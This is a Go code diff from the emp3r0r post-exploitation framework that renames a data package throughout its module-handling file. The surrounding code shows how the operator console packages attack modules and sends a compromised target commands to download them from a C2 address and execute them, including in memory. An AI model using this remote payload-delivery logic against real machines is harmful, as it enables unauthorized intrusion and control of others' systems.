@@ -13,7 +13,7 @@ import (
 
 	"github.com/google/uuid"
 	"github.com/jm33-m0/arc"
-	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/olekukonko/tablewriter"
@@ -36,7 +36,7 @@ import (
 //	}
 
 // stores module configs
-var ModuleConfigs = make(map[string]emp3r0r_data.ModConfig, 1)
+var ModuleConfigs = make(map[string]emp3r0r_def.ModConfig, 1)
 
 // stores module names for fuzzy search
 var ModuleNames = make(map[string]string)
@@ -61,7 +61,7 @@ func moduleCustom() {
 		}
 
 		if config.IsInteractive {
-			exec_cmd = fmt.Sprintf("echo %s", strconv.Quote(tun.SHA256SumRaw([]byte(emp3r0r_data.MagicString))))
+			exec_cmd = fmt.Sprintf("echo %s", strconv.Quote(tun.SHA256SumRaw([]byte(emp3r0r_def.MagicString))))
 		}
 
 		if config.InMemory {
@@ -73,7 +73,7 @@ func moduleCustom() {
 	}()
 }
 
-func updateModuleOptions(config *emp3r0r_data.ModConfig) {
+func updateModuleOptions(config *emp3r0r_def.ModConfig) {
 	for opt := range config.Options {
 		option, ok := Options[opt]
 		if !ok {
@@ -92,7 +92,7 @@ func getDownloadAddr() string {
 	return ""
 }
 
-func handleInMemoryModule(config emp3r0r_data.ModConfig, payload_type, download_addr string) {
+func handleInMemoryModule(config emp3r0r_def.ModConfig, payload_type, download_addr string) {
 	hosted_file := WWWRoot + CurrentMod + ".xz"
 	CliPrintInfo("Compressing %s with xz...", CurrentMod)
 	path := fmt.Sprintf("%s/%s/%s", config.Path, CurrentMod, config.Exec)
@@ -113,7 +113,7 @@ func handleInMemoryModule(config emp3r0r_data.ModConfig, payload_type, download_
 		return
 	}
 	cmd := fmt.Sprintf("%s --mod_name %s --type %s --file_to_download %s --checksum %s --in_mem --download_addr %s",
-		emp3r0r_data.C2CmdCustomModule, CurrentMod, payload_type, util.FileBaseName(hosted_file), tun.SHA256SumFile(hosted_file), download_addr)
+		emp3r0r_def.C2CmdCustomModule, CurrentMod, payload_type, util.FileBaseName(hosted_file), tun.SHA256SumFile(hosted_file), download_addr)
 	cmd_id := uuid.NewString()
 	CliPrintInfo("Sending command %s to %s", cmd, CurrentTarget.Tag)
 	err = SendCmdToCurrentTarget(cmd, cmd_id)
@@ -122,7 +122,7 @@ func handleInMemoryModule(config emp3r0r_data.ModConfig, payload_type, download_
 	}
 }
 
-func handleCompressedModule(config emp3r0r_data.ModConfig, payload_type, exec_cmd, envStr, download_addr string) {
+func handleCompressedModule(config emp3r0r_def.ModConfig, payload_type, exec_cmd, envStr, download_addr string) {
 	tarball_path := WWWRoot + CurrentMod + ".tar.xz"
 	file_to_download := filepath.Base(tarball_path)
 	if !util.IsFileExist(tarball_path) {
@@ -141,7 +141,7 @@ func handleCompressedModule(config emp3r0r_data.ModConfig, payload_type, exec_cm
 
 	checksum := tun.SHA256SumFile(tarball_path)
 	cmd := fmt.Sprintf("%s --mod_name %s --checksum %s --env \"%s\" --download_addr %s --type %s --file_to_download %s --exec \"%s\"",
-		emp3r0r_data.C2CmdCustomModule,
+		emp3r0r_def.C2CmdCustomModule,
 		CurrentMod, checksum, envStr, download_addr, payload_type, file_to_download, exec_cmd)
 	cmd_id := uuid.NewString()
 	err := SendCmdToCurrentTarget(cmd, cmd_id)
@@ -154,14 +154,14 @@ func handleCompressedModule(config emp3r0r_data.ModConfig, payload_type, exec_cm
 	}
 }
 
-func handleInteractiveModule(config emp3r0r_data.ModConfig, cmd_id string) {
+func handleInteractiveModule(config emp3r0r_def.ModConfig, cmd_id string) {
 	opt, exists := config.Options["args"]
 	if !exists {
 		config.Options["args"] = []string{"--", "No args"}
 	}
 	args := opt[0]
 	port := strconv.Itoa(util.RandInt(1024, 65535))
-	look_for := tun.SHA256SumRaw([]byte(emp3r0r_data.MagicString))
+	look_for := tun.SHA256SumRaw([]byte(emp3r0r_def.MagicString))
 
 	for i := 0; i < 10; i++ {
 		if strings.Contains(CmdResults[cmd_id], look_for) {
@@ -271,7 +271,7 @@ func InitModules() {
 			ModuleHelpers[config.Name] = moduleCustom
 
 			// add module meta data
-			emp3r0r_data.Modules[config.Name] = config
+			emp3r0r_def.Modules[config.Name] = config
 
 			readConfigErr = updateModuleHelp(config)
 			if readConfigErr != nil {
@@ -283,7 +283,7 @@ func InitModules() {
 		}
 
 		// make []string for fuzzysearch
-		for name, modObj := range emp3r0r_data.Modules {
+		for name, modObj := range emp3r0r_def.Modules {
 			ModuleNames[name] = modObj.Comment
 		}
 	}
@@ -297,7 +297,7 @@ func InitModules() {
 }
 
 // readModCondig read config.json of a module
-func readModCondig(file string) (pconfig *emp3r0r_data.ModConfig, err error) {
+func readModCondig(file string) (pconfig *emp3r0r_def.ModConfig, err error) {
 	// read JSON
 	jsonData, err := os.ReadFile(file)
 	if err != nil {
@@ -305,7 +305,7 @@ func readModCondig(file string) (pconfig *emp3r0r_data.ModConfig, err error) {
 	}
 
 	// parse the json
-	config := emp3r0r_data.ModConfig{}
+	config := emp3r0r_def.ModConfig{}
 	err = json.Unmarshal(jsonData, &config)
 	if err != nil {
 		return nil, fmt.Errorf("failed to unmarshal JSON config: %v", err)
@@ -315,7 +315,7 @@ func readModCondig(file string) (pconfig *emp3r0r_data.ModConfig, err error) {
 }
 
 // genModStartCmd reads config.json of a module and generates env string (VAR=value,VAR2=value2 ...)
-func genModStartCmd(config *emp3r0r_data.ModConfig) (payload_type, exec_path, envStr string, err error) {
+func genModStartCmd(config *emp3r0r_def.ModConfig) (payload_type, exec_path, envStr string, err error) {
 	exec_path = config.Exec
 	payload_type = config.Type
 	var builder strings.Builder
@@ -332,14 +332,14 @@ func genModStartCmd(config *emp3r0r_data.ModConfig) (payload_type, exec_path, en
 	return
 }
 
-func updateModuleHelp(config *emp3r0r_data.ModConfig) error {
+func updateModuleHelp(config *emp3r0r_def.ModConfig) error {
 	help_map := make(map[string][]string)
 	for opt, val_help := range config.Options {
 		if len(val_help) < 2 {
 			return fmt.Errorf("%s config error: %s incomplete", config.Name, opt)
 		}
 		help_map[opt] = val_help
-		emp3r0r_data.Modules[config.Name].Options = help_map
+		emp3r0r_def.Modules[config.Name].Options = help_map
 	}
 	return nil
 }
